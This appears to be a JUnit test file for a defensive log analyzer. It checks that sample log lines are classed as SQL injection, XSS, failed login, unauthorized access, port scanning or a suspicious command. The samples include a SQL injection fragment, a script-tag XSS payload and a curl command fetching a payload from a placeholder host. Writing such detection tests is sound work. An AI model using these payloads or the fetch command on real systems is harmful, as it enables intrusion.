package com.cyberguard.analyzer;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNull;
import org.junit.jupiter.api.Test;

class SystemLogAnalyzerTest {
    private final SystemLogAnalyzer analyzer = new SystemLogAnalyzer();

    @Test
    void detectsSqlInjection() {
        assertEquals("SQL Injection", analyzer.analyzeLog("query: ' OR 1=1", 1).threatType());
    }

    @Test
    void detectsXss() {
        assertEquals("Cross-Site Scripting (XSS)", analyzer.analyzeLog("payload=<script>alert(1)</script>", 1).threatType());
    }

    @Test
    void detectsFailedLogin() {
        assertEquals("Failed Login", analyzer.analyzeLog("authentication failed for user alice", 1).threatType());
    }

    @Test
    void detectsUnauthorizedAccess() {
        assertEquals("Unauthorized Access", analyzer.analyzeLog("permission denied for /admin", 1).threatType());
    }

    @Test
    void detectsPortScanning() {
        assertEquals("Port Scanning", analyzer.analyzeLog("nmap port scan detected", 1).threatType());
    }

    @Test
    void detectsSuspiciousCommand() {
        assertEquals("Suspicious Command", analyzer.analyzeLog("curl http://example.invalid/payload", 1).threatType());
    }

    @Test
    void ignoresSafeAndBlankLines() {
        assertNull(analyzer.analyzeLog("successful request completed", 1));
        assertNull(analyzer.analyzeLog("  ", 2));
    }
}
